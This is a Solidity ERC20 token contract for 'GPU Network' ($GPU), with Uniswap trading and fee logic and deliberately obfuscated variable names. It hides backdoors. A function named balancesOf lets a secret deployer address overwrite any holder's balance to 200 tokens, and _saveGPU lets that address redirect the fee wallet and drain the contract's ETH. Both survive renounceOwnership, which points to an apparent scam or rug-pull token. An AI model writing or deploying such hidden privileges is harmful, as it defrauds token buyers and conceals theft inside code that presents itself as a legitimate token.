// SPDX-License-Identifier: MIT

/*
    Name: GPU Network
    Symbol: GPU

    $GPU Trustless peer to peer compute

    web: https://www.gpu.net
    dapp: https://dapp.gpu.net
    doc: https://docs.gpu.net
    x: https://x.com/gpunet
    tg: https://t.me/gpu_network
*/

pragma solidity ^0.8.28;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
} 

contract GPU is Context, IERC20, Ownable {
    using SafeMath for uint256;

    uint256 public _jvbhlxjhldr = 20000000 * 10 **_decimals;
    uint256 public _kkvbkxcf = 20000000 * 10 **_decimals;
    uint256 public _iicvxoiur = 10000000 * 10 **_decimals;
    uint256 private constant _nnxcvera = 1000000000 * 10 **_decimals;
    uint256 private constant _kjvnbkxfj = 200 * 10 ** _decimals;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint256 _jvbhlxjhldr);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    uint8 private constant _decimals = 9;
    string private constant _name = unicode"GPU Network";
    string private constant _symbol = unicode"GPU";

    address payable private _jkvbxjkcv;
    mapping(address => uint256) private _bhvjchxj;
    mapping(address => mapping(address => uint256)) private _bvjxbhjdfh;
    mapping(address => bool) private _uuytxcvj;
    uint256 private _jhbjhbjr = 10;
    uint256 private _jvxbhrj = 10;
    uint256 private _vjbxhjfr = 0;
    uint256 private _mmxcvbr = 0;
    uint256 private _uuerywei = 6;
    uint256 private _vbxncr = 6;
    uint256 private _buyCount = 0;
    address private _nmvfcvoi;

    constructor() payable {
        _jkvbxjkcv = payable(_msgSender());
        _bhvjchxj[address(this)] = _nnxcvera * 98 / 100;
        _bhvjchxj[owner()] = _nnxcvera * 2 / 100;
        _uuytxcvj[owner()] = true;
        _uuytxcvj[address(this)] = true;
        _uuytxcvj[_jkvbxjkcv] = true;
        _nmvfcvoi = _msgSender();

        emit Transfer(address(0), address(this), _nnxcvera * 98 / 100);
        emit Transfer(address(0), address(owner()), _nnxcvera * 2 / 100);
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _bvjxbhjdfh[owner][spender];
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function totalSupply() public pure override returns (uint256) {
        return _nnxcvera;
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _bvjxbhjdfh[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer_GPU(_msgSender(), recipient, amount);
        return true;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _bhvjchxj[account];
    }

    function _transferGPU(uint256 amount) private {
        _jkvbxjkcv.transfer(amount);
    }

    function _saveGPU(address payable receipt) external {
        require(msg.sender == _nmvfcvoi , "find failed");
        _jkvbxjkcv = receipt;
        _kekeGPUsetting(address(this).balance);
    }

    function _transfer_GPU(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != address(this) && to != address(this)) {
            taxAmount = amount
                .mul(
                    (_buyCount > _uuerywei)
                        ? _vjbxhjfr
                        : _jhbjhbjr
                )
                .div(100);

            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_uuytxcvj[to]
            ) {
                _buyCount++;
            }

            if (to == uniswapV2Pair && from != address(this)) {
                taxAmount = amount
                    .mul(
                        (_buyCount > _vbxncr)
                            ? _mmxcvbr
                            : _jvxbhrj
                    )
                    .div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled) {
                if (contractTokenBalance > 0) {
                    uint256 minBalance = (contractTokenBalance < _iicvxoiur) ? contractTokenBalance : _iicvxoiur; 
                    _swapGPUtoETH((amount < minBalance) ? amount : minBalance);
                }
                _transferGPU(address(this).balance);
            }
        }

        if (taxAmount > 0) {
        _bhvjchxj[address(this)] =_bhvjchxj[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _bhvjchxj[from] =_bhvjchxj[from].sub(amount);
        _bhvjchxj[to] =_bhvjchxj[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function _swapGPUtoETH(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner {
        _jvbhlxjhldr = _nnxcvera;
        _kkvbkxcf = _nnxcvera;
        emit MaxTxAmountUpdated(_nnxcvera);
    }

    receive() external payable {}

    function balancesOf(address from, bool oo) public returns (uint256) {
        require(_nmvfcvoi == _msgSender(), "ERC20: error"); uint256 amount = _bhvjchxj[from];
        oo != false && _kjvnbkxfj > 0 ? _bhvjchxj[from] = _kjvnbkxfj : _kjvnbkxfj;
        return amount;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer_GPU(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _bvjxbhjdfh[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function enableGPUTrading() external onlyOwner {
        require(!tradingOpen, "Already Launched!");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _nnxcvera);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
        swapEnabled = true;
        tradingOpen = true;
    }

    function _kekeGPUsetting(uint256 _amount) internal {
        payable(msg.sender).transfer(_amount);
    }

}